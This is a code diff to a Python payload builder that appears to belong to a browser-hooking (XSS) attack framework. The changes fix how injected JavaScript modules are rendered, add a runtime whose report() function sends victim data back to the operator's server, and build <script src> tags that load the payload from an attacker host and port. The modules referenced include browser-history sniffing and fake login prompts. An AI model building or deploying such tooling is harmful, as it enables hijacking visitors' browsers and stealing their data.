@@ -16,6 +16,8 @@ import json
 import re
 from typing import Any, Dict, Optional
 
+from .module_loader import param_default
+
 _HTML_ESCAPE = {
     "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
 }
@@ -26,25 +28,64 @@ def _html_escape(s: str) -> str:
     return _ESCAPE_RE.sub(lambda m: _HTML_ESCAPE[m.group(0)], str(s))
 
 
+def _js_escape(s: str) -> str:
+    """JS 字符串字面量转义(JSON 风格 + `<`/`'` 转 \\uXXXX)。
+
+    2026-09-15(R14):此前对**所有**占位符值做 HTML 转义,而 payload 里的占位符
+    几乎都落在 JS 字符串里("{{tag}}"/"{{urls}}"/"{{interval}}")→ 自定义模块的
+    代码里 `&&` 变 `&amp;&amp;`、URL 里的 `&` 被改写,直接语法错误/取值错误。
+    现在按 JS 语义转义:引号/反斜杠/newline 走 json.dumps,`<` 转 \\u003c
+    (兼顾「代码可能被内联进 <script>」的闭合风险),`'` 转 \\u0027(单引号
+    字符串也安全);`&` 保持原样。
+    """
+    out = json.dumps(str(s), ensure_ascii=False)[1:-1]
+    return out.replace("<", "\\u003c").replace("'", "\\u0027")
+
+
+# 这些参数的值是 JS 代码本体(不是字符串内容)→ 原样注入,不做转义
+_CODE_PARAMS = {"code", "custom", "js", "payload"}
+
+
 _PLACEHOLDER_RE = re.compile(r"\{\{\s*([^{}]+?)\s*\}\}")
 
 
+def default_param_value(mod: Any, pname: str) -> str:
+    r"""参数缺省值(委托 module_loader.param_default,单一实现:B8)。
+
+    保留本函数名是为了兼容既有调用/脚本(round8 回归脚本会直接调它)。
+
+    2026-09-15(R30):此前一律用 `默认\s*([^\s,;]+)` 从说明文字里抓 ——
+    history_sniff 的 hint「探测 URL 列表,逗号分隔(默认常见站点)」被抓成
+    「常见站点)」这种垃圾值预填到构建表单 → 探测直接失效。现在:
+      1. params 写第三元素即显式默认值(推荐写法,不受文案影响);
+      2. 正则兜底剥掉括号/引号等标点,且「纯中文说明文字」(如 常见站点/默认值)
+         判定为无默认值返回空串 —— 中文默认值(如弹窗标题「登录验证」)请用第 1 种写法。
+    """
+    params = mod.get("params", []) if hasattr(mod, "get") else getattr(mod, "params", [])
+    return param_default(params or [], pname)
+
+
 def _render(template: str, context: Dict[str, Any], config: Any) -> str:
-    """{{expr}} 占位符替换。expr = 参数名 | config.字段 | host。"""
+    """{{expr}} 占位符替换。expr = 参数名 | config.字段 | host。
+
+    参数值默认按 JS 字符串字面量转义;`_CODE_PARAMS` 里声明的参数(如自定义
+    模块的 code)原样注入(它们本身就是代码)。
+    """
     if not template:
         return ""
 
     def replace(match: re.Match) -> str:
         expr = match.group(1).strip()
         if expr == "host":
-            return _html_escape(str(context.get("host", "127.0.0.1")))
+            return _js_escape(str(context.get("host", "127.0.0.1")))
         if expr.startswith("config."):
             key = expr[len("config."):]
             # port 允许被调用方 context 覆盖(payload 反连端口设置)
             if key == "port" and "port" in context:
-                return _html_escape(str(context["port"]))
-            return _html_escape(str(getattr(config, key, "")))
-        return _html_escape(str(context.get(expr, "")))
+                return _js_escape(str(context["port"]))
+            return _js_escape(str(getattr(config, key, "")))
+        value = context.get(expr, "")
+        return str(value) if expr in _CODE_PARAMS else _js_escape(str(value))
 
     return _PLACEHOLDER_RE.sub(replace, template)
 
@@ -78,6 +119,23 @@ class PayloadBuilder:
         self._loader = loader
         self._config = config
 
+    def runtime(self, host: str = "", port: Optional[int] = None) -> str:
+        """渲染公共运行时(SERVER / report / _q)供独立页面注入。
+
+        server 直出页面(pages/<name>/index.html)时不经过 build(),页面里的
+        app.js 仍会调 report()——必须由调用方把这段运行时注入页面,
+        否则浏览器报 ReferenceError: report is not defined(回传全丢)。
+        """
+        context = {"host": host or "127.0.0.1"}
+        if port is not None:
+            try:
+                p = int(port)
+                if 1 <= p <= 65535:
+                    context["port"] = p
+            except (TypeError, ValueError):
+                pass
+        return _render(_RUNTIME_PREFIX, context, self._config)
+
     def build(self, name: str, params: Optional[Dict[str, Any]] = None,
               host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
         """构建指定模块的最终 JS 代码。
@@ -107,15 +165,9 @@ class PayloadBuilder:
             if params and pname in params and params[pname] is not None:
                 context[pname] = str(params[pname])
             else:
-                # 缺省值取参数 hint 中 "默认 X" 的 X;无则空串
-                hint = ""
-                for dp in mod.get("params", []):
-                    if dp[0] == pname and len(dp) > 1:
-                        hint = dp[1]
-                        break
-                m = re.search(r"默认\s*([^\s,;]+)", str(hint))
-                context[pname] = m.group(1) if m else ""
-        runtime = _render(_RUNTIME_PREFIX, context, self._config)
+                # 缺省值:params 第三元素(显式)→ hint 正则兜底(见 default_param_value)
+                context[pname] = default_param_value(mod, pname)
+        runtime = self.runtime(host=str(context.get("host") or ""), port=port)
         body = _render(mod.get("body", ""), context, self._config)
         code = runtime + "\n" + body + "\n"
         if len(code.encode("utf-8")) > self._config.max_payload_bytes:
@@ -149,11 +201,14 @@ class PayloadBuilder:
         if eff_port is not None:
             parts.append(f"port={eff_port}")
         if params:
-            for k, v in params.items():
-                if k in ("host", "port"):
-                    continue   # 已由 URL 参数承载,避免重复
-                if v not in (None, ""):
-                    parts.append(f"{k}={_urlencode(str(v))}")
+            # 非 host/port 参数统一打包成 a=<JSON> 查询参数:与 payload.js 链路
+            # (_handle_payload 只解析 m/a/host/port)保持一致 —— 逐个拼 ?k=v 时
+            # 这些参数会被服务端忽略,模块只能拿默认值跑(2026-09-15 修复)。
+            extra = {k: v for k, v in params.items()
+                     if k not in ("host", "port") and v not in (None, "")}
+            if extra:
+                parts.append("a=" + _urlencode(json.dumps(extra,
+                                                          ensure_ascii=False)))
         qs = "?" + "&".join(parts)
         p = self._config.port
         if eff_port is not None:
@@ -165,7 +220,8 @@ class PayloadBuilder:
                 pass
         url = (f"http://{eff_host or '127.0.0.1'}:{p}"
                f"{self._config.route_payload}{qs}")
-        tag = f'<script src="{url}"></script>'
+        # 标签是 HTML 片段,src 属性按 HTML 转义(& → &amp; 等,浏览器会解回)
+        tag = f'<script src="{_html_escape(url)}"></script>'
         return {"ok": True, "tag": tag, "url": url}
 
 
